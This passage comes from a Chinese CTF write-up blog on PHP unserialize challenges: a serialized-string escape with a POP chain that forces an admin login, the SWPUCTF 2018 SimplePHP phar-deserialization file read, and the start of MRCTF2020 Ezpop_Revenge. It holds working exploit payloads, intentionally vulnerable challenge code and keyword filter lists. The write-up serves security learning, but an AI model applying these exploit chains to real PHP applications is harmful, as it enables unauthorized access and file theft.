class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($newInfo,$sql)</span></span>&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该类中析构函数会输出sql语句，也就是在销毁类时会自动调用，注意到User类中有__toString()魔术方法，这里可以赋值sql为User类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">        $mysqli=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id=$mysqli-&gt;login(<span class="string">'select id,password from user where username=?'</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;id)&#123;</span><br><span class="line">        $_SESSION[<span class="string">'id'</span>]=<span class="keyword">$this</span>-&gt;id;</span><br><span class="line">        $_SESSION[<span class="string">'login'</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"你的ID是"</span>.$_SESSION[<span class="string">'id'</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"你好！"</span>.$_SESSION[<span class="string">'token'</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;script&gt;window.location.href='./update.php'&lt;/script&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">        $age=$Info-&gt;age;</span><br><span class="line">        $nickname=$Info-&gt;nickname;</span><br><span class="line">        $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">'id'</span>],$Info,<span class="string">"update user SET age=$age,nickname=$nickname where id="</span>.$_SESSION[<span class="string">'id'</span>]);</span><br><span class="line">        <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $age=$_POST[<span class="string">'age'</span>];</span><br><span class="line">        $nickname=$_POST[<span class="string">'nickname'</span>];</span><br><span class="line">        <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;nickname);<span class="comment">//危</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"0-0"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用__toString()魔术方法之后，会调用update方法，并且参数值为age，nickname为Info类，就会调用__call()魔术方法，并且以age为参数值 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($age,$nickname)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=$nickname;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name,$argument)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$CtrlCase</code>调用了<code>login()</code>方法，参数是<code>User.age</code>的值传进来的，这样只需要将这个类里的<code>$CtrlCase</code>变量实例化为<code>dbCtrl</code>类的对象，这样就相当于调用了<code>dbCtrl::login($sql)</code>，而且参数sql语句也可以控制,最后只用更改一下dbCtrl类中的参数值即可</p><p>poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sql = <span class="keyword">new</span> User();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;CtrlCase = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="string">'select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname = <span class="keyword">new</span> Info();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">"admin"</span>;</span><br><span class="line">    <span class="keyword">public</span> $password = <span class="string">"1"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$o = <span class="keyword">new</span> UpdateHelper();</span><br><span class="line"><span class="keyword">echo</span> serialize($o);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:12:"UpdateHelper":1:&#123;s:3:"sql";O:4:"User":2:&#123;s:3:"age";s:70:"select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?";s:8:"nickname";O:4:"Info":1:&#123;s:8:"CtrlCase";O:6:"dbCtrl":2:&#123;s:4:"name";s:5:"admin";s:8:"password";s:1:"1";&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>到这里还没有结束，注意到传入的age和nickname值会经过safe函数的过滤，来看一下safe函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($parm)</span></span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">'union'</span>,<span class="string">'regexp'</span>,<span class="string">'load'</span>,<span class="string">'into'</span>,<span class="string">'flag'</span>,<span class="string">'file'</span>,<span class="string">'insert'</span>,<span class="string">"'"</span>,<span class="string">'\\'</span>,<span class="string">"*"</span>,<span class="string">"alter"</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">'hacker'</span>,$parm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以说是很熟悉的东西了，字符串逃逸，只要存在数组中的值全部替换成hacker，这就可以让序列化的数据逃逸，具体可以去看buu上的一道piapiapia</p><p>final poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion<span class="string">";s:8:"</span>CtrlCase<span class="string">";O:12:"</span>UpdateHelper<span class="string">":1:&#123;s:3:"</span>sql<span class="string">";O:4:"</span>User<span class="string">":2:&#123;s:3:"</span>age<span class="string">";s:70:"</span>select <span class="number">1</span>,<span class="string">"c4ca4238a0b923820dcc509a6f75849b"</span> from user where username=?<span class="string">";s:8:"</span>nickname<span class="string">";O:4:"</span>Info<span class="string">":1:&#123;s:8:"</span>CtrlCase<span class="string">";O:6:"</span>dbCtrl<span class="string">":2:&#123;s:4:"</span>name<span class="string">";s:5:"</span>admin<span class="string">";s:8:"</span>password<span class="string">";s:1:"</span><span class="number">1</span><span class="string">";&#125;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>最后在update.php页面post传值,登录界面以admin和1登录，就能直接看到flag了</p><img src="/2020/05/30/unserialize/3.png" class=""><h3 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h3><p>期末考试复习，中间差不多20多天没做过题了，特别是序列化的题，生疏了，赶紧来练练找找感觉</p><p>开题是一个，能够查看文件和上传文件，上传小马的图片马，只提示上传成功，也没有给上传路径，在查看文件那里找到利用点</p><img src="/2020/05/30/unserialize/4.png" class=""><p>逐个看包含的文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#file.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>; </span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/var/www/html/'</span>); </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>] ? $_GET[<span class="string">'file'</span>] : <span class="string">""</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($file)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;There is no file to show!&lt;h2/&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line">$show = <span class="keyword">new</span> Show(); </span><br><span class="line"><span class="keyword">if</span>(file_exists($file)) &#123; </span><br><span class="line">    $show-&gt;source = $file; </span><br><span class="line">    $show-&gt;_show(); </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>($file))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'file doesn\'t exists.'</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;   <span class="comment">//$this-&gt;source = phar://phar.jpg</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($key,$value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker~"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[$key])) &#123;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在class.php中看到有提示phar，应该是要利用phar</p><p>先看show()类，过滤了f14g，有个toString()魔术方法可以用</p><p>再看Test()类__get()魔术方法调用get函数，get函数会调用file_get函数，函数会返回包含文件的base64编码的内容</p><p>最后再看C1e4r()类，__destruct()魔术方法中有输出，这就可以调用show()类中的tostring()魔术方法，再通过让$this-&gt;str[‘str’]=Test()类，会触发__get()魔术方法，就可以拿到想要的数据</p><p>pop链</p><p>1.利用C1e4r类的<code>__destruct()</code>中的<code>echo $this-&gt;test</code><br>2.触发Show类的<code>__toString()</code><br>3.利用Show类的<code>$content = $this-&gt;str[&#39;str&#39;]-&gt;source</code><br>4.触发Test类的<code>__get()</code><br>5.成功利用<code>file_get()</code>读文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $test;</span><br><span class="line"><span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Test();</span><br><span class="line">$a-&gt;params[<span class="string">'source'</span>] = <span class="string">"/var/www/html/f1ag.php"</span>;</span><br><span class="line">$b = <span class="keyword">new</span> Show();</span><br><span class="line">$c = <span class="keyword">new</span> C1e4r();</span><br><span class="line">$b-&gt;str[<span class="string">'str'</span>] = $a;</span><br><span class="line">$c-&gt;str = $b; </span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'nice.phar'</span>);</span><br><span class="line">$phar -&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);<span class="comment">//固定格式</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);<span class="comment">//签名</span></span><br><span class="line">$phar-&gt;setMetadata($c);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成的文件改一下后缀名，改为jpg再上传，这里文件上传后的存储名为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> md5(<span class="string">'nice.jpg174.0.0.2'</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#5f9b471df88c9f1ed164a76a5121a2eb</span></span><br></pre></td></tr></table></figure><img src="/2020/05/30/unserialize/5.png" class=""><h3 id="MRCTF2020-Ezpop-Revenge"><a href="#MRCTF2020-Ezpop-Revenge" class="headerlink" title="[MRCTF2020]Ezpop_Revenge"></a>[MRCTF2020]Ezpop_Revenge</h3><p>一道反序列化题，给了Typecho框架的源码，要自己找利用链，找了一篇文章<a href="http://blog.nsfocus.net/typecho-vulnerability-analysis/先看着" target="_blank" rel="noopener">http://blog.nsfocus.net/typecho-vulnerability-analysis/先看着</a></p><p>开题，就是一个不成型的typecho页面，扫一下目录，<a href="http://www.zip,没有找到install.php文件，这条链子不通，查找unserialize()魔术方法" target="_blank" rel="noopener">www.zip,没有找到install.php文件，这条链子不通，查找unserialize()魔术方法</a></p><p>在usr/plugins/HelloWorld/Plugin.php中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'admin'</span>])) var_dump($_SESSION);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'C0incid3nc3'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/file|assert|eval|[`\'~^?&lt;&gt;$%]+/i"</span>,base64_decode($_POST[<span class="string">'C0incid3nc3'</span>])) === <span class="number">0</span>)</span><br><span class="line">            unserialize(base64_decode($_POST[<span class="string">'C0incid3nc3'</span>]));</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Not that easy."</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要传入了admin就会输出session</p><p>接着找__wakeup()魔术方法，还是同一个文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 